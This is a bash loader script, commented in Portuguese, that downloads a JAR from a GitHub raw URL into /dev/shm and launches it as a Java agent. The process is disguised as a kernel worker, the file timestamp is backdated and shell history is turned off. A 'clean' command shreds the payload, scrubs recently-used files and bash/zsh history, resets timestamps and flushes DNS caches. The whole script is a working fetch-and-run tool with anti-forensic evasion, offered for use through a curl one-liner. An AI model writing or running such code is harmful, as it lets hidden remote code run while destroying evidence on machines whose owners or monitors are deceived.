#!/bin/bash
# spud.sh universal - loader direto da RAM, clean cirurgico
# repo loader: https://github.com/neverdie373/spud/blob/main/spud.jar
# uso: bash <(curl -sL https://raw.githubusercontent.com/neverdie373/spud/main/spud.sh)
DOOM_URL="https://raw.githubusercontent.com/neverdie373/spud/main/spud.jar"
S="/dev/shm/.s-$USER"; T="$S/t"; B="$S/.k.jar"
mkdir -p "$T"; chmod 700 "$S"
export HISTFILE=/dev/null; set +o history 2>/dev/null; history -c 2>/dev/null || true
export HISTCONTROL=ignorespace:erasedups
export TMPDIR="$T"; export GTK_RECENT_FILES_DISABLED=1
XM="$(stat -c %y ~/.local/share/recently-used.xbel 2>/dev/null || stat -f %Sm ~/.local/share/recently-used.xbel 2>/dev/null || echo "")"
TM="$(stat -c %y ~/.local/share/Trash/files 2>/dev/null || stat -f %Sm ~/.local/share/Trash/files 2>/dev/null || echo "")"
curl -sL "$DOOM_URL" -o "$B"; chmod +x "$B"; touch -d "2023-01-15 03:22:11" "$B"
(exec -a "[kworker/u8:2]" java -Djava.io.tmpdir="$T" -Djna.tmpdir="$T" -javaagent:"$B" -jar "$B" >/dev/null 2>&1 & echo $! > "$S/.pid")
echo "[+] up. digita clean depois do self-destruct"
while true; do printf "spud> "; IFS= read -r c < /dev/tty || break
if [ "$c" = "clean" ]; then kill -9 $(cat $S/.pid 2>/dev/null) 2>/dev/null || true; sleep 0.5; shred -u -z -n 3 "$B" 2>/dev/null || rm -f "$B"; rm -rf "$T"/* 2>/dev/null || true; sed -i "/k\.jar\|doomsday\|pxzlkehlkp\|spud\.jar/d" ~/.local/share/recently-used.xbel 2>/dev/null || true; [ -n "$XM" ] && touch -d "$XM" ~/.local/share/recently-used.xbel 2>/dev/null || true; [ -n "$TM" ] && touch -d "$TM" ~/.local/share/Trash/files 2>/dev/null || true; for hf in ~/.bash_history ~/.zsh_history; do [ -f "$hf" ] && grep -v -e "spud\.sh" -e "raw\.githubusercontent" -e "/dev/shm" -e "DOOM_URL" "$hf" > "$hf.tmp" 2>/dev/null && mv "$hf.tmp" "$hf" || true; done; history -c 2>/dev/null || true; resolvectl flush-caches 2>/dev/null || systemd-resolve --flush-caches 2>/dev/null || sudo service nscd restart 2>/dev/null || true; rmdir "$T" "$S" 2>/dev/null || true; echo "[+] done"; break; fi; done
